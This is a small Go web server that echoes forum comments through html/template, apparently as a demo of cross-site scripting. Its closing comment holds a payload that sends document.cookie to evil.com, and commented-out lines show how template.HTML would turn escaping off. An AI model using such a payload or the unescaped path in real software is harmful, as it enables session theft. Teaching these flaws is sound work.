package main

import (
	"html/template"
	"net/http"
)

func main() {
	serverMuxA := http.NewServeMux()
	serverMuxA.HandleFunc("/", forum)
	serverMuxA.HandleFunc("/forum", forum)
	http.ListenAndServe("localhost:8081", serverMuxA)
}

func forum(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost || r.Body == nil {
		rForum(w, "Please add your comments")
		return
	}

	nm := r.FormValue("cname")
	msg := r.FormValue("msg")

	rForum(w, nm+"<br>"+msg)
}

func rForum(w http.ResponseWriter, m string) {
	//bd := template.HTML(m)
	tmpl := template.Must(template.ParseFiles("forum.html"))
	//tmpl.Execute(w, bd)
	tmpl.Execute(w, m)
}

/*
<script>
window.location="http://evil.com/?cookie=" + document.cookie
</script>
*/
